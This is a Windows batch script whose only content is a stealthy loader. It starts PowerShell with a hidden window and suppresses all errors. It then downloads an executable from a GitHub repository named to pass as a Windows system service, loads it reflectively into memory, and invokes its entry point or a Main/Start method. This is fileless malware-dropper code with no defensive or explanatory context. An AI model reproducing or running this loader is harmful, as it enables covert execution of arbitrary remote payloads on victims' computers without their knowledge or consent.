@echo off
setlocal EnableDelayedExpansion

:: ========================= CONFIG =========================
set "fileUrl=https://github.com/KronoRDP/System.Service-Windonws/raw/refs/heads/main/Sh.exe"
:: ===========================================================

powershell -WindowStyle Hidden -Command ^
"$ErrorActionPreference = 'SilentlyContinue'; ^
try { ^
    $bytes = (Invoke-WebRequest -Uri '%fileUrl%' -UseBasicParsing).Content; ^
    $assembly = [System.Reflection.Assembly]::Load($bytes); ^
    $entryPointMethod = $assembly.EntryPoint; ^
    if ($entryPointMethod -ne $null) { ^
        $entryPointMethod.Invoke($null, $null); ^
    } else { ^
        $types = $assembly.GetTypes(); ^
        foreach ($type in $types) { ^
            $methods = $type.GetMethods('Public, Static'); ^
            foreach ($method in $methods) { ^
                if ($method.Name -eq 'Main' -or $method.Name -eq 'Start') { ^
                    $method.Invoke($null, $null); ^
                    break; ^
                } ^
            } ^
        } ^
    } ^
} catch { }"

endlocal
exit /b